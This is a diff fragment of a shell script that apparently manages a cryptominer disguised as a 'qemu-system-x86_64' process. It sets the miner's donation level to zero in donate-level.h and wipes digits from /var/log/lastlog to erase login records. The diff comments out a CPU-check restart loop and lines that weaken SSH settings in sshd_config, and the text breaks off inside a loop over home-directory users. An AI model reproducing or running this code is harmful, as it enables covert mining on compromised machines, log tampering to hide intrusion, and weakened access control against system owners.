@@ -29,20 +29,20 @@ sleep 2
 process=`ps aux | grep -v grep | grep root | grep qemu | awk '{print $2}'`
 cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
 for_test=$((cpus * 100 - 100))
-while [ $for_test -gt $cpusage ]; do
-echo "while loop"
-kill -9 $process
-nohup ./qemu-system-x86_64 &
-sleep 2
-cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
-done
+#while [ $for_test -gt $cpusage ]; do
+#echo "while loop"
+#kill -9 $process
+#nohup ./qemu-system-x86_64 &
+#sleep 2
+#cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
+#done
 sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/donate-level.h
 cd
-sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_config
-sed -i 's/RSAAuthentication yes/RSAAuthentication no/g' /etc/ssh/sshd_config
-sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
-service sshd restart
+#sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+#sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_config
+#sed -i 's/RSAAuthentication yes/RSAAuthentication no/g' /etc/ssh/sshd_config
+#sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
+#service sshd restart
 sed -i 's/[0-9]/0/g' /var/log/lastlog
 users=`ll /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
 for i in ${users}; do
